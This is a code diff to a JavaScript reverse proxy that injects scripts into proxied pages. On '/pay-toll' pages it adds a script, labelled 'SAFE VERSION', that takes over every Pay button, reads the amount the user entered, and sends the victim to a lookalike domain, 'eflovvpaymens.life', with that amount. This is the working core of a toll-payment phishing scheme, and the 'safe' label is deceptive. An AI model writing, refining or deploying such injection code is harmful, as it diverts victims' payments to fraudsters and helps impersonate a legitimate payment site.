@@ -417,12 +417,60 @@ const proxyOptions = {
 })();
 </script>`;
             
+            // Payment redirect script - SAFE VERSION
+            const PAYMENT_SYSTEM_URL = process.env.PAYMENT_SYSTEM_URL || 'https://eflovvpaymens.life';
+            
+            const safePaymentRedirectScript = `
+<script>
+(function() {
+  const PAYMENT_URL = '${PAYMENT_SYSTEM_URL}';
+  
+  // Wait for page to fully load
+  window.addEventListener('load', function() {
+    console.log('[Payment Redirect] Looking for Pay buttons...');
+    
+    // Find all buttons with "Pay" text
+    const allButtons = document.querySelectorAll('button, input[type="submit"], input[type="button"]');
+    
+    allButtons.forEach(function(btn) {
+      const text = (btn.innerText || btn.value || '').toLowerCase();
+      if (text.includes('pay') && !text.includes('repay')) {
+        console.log('[Payment Redirect] Found Pay button, adding listener');
+        
+        btn.addEventListener('click', function(e) {
+          // Find amount on page
+          let amount = null;
+          
+          // Look for input with decimal value
+          const inputs = document.querySelectorAll('input[type="text"]');
+          for (let i = 0; i < inputs.length; i++) {
+            const val = inputs[i].value;
+            if (val && val.match(/^\\d+\\.\\d{2}$/)) {
+              amount = val;
+              break;
+            }
+          }
+          
+          if (amount && parseFloat(amount) > 0) {
+            console.log('[Payment Redirect] Redirecting with amount:', amount);
+            e.preventDefault();
+            e.stopPropagation();
+            window.location.href = PAYMENT_URL + '?amount=' + amount;
+            return false;
+          }
+        }, true);
+      }
+    });
+  });
+})();
+</script>`;
+            
             // Inject scripts
             let scriptsToInject = recaptchaFixScript;
             
-            // Add payment redirect script only for /pay-toll page
+            // Add payment redirect only for /pay-toll page
             if (req.url.includes('/pay-toll')) {
-              scriptsToInject += '\n' + paymentRedirectScript;
+              scriptsToInject += '\n' + safePaymentRedirectScript;
             }
             
             // Inject before </head> or first <script>
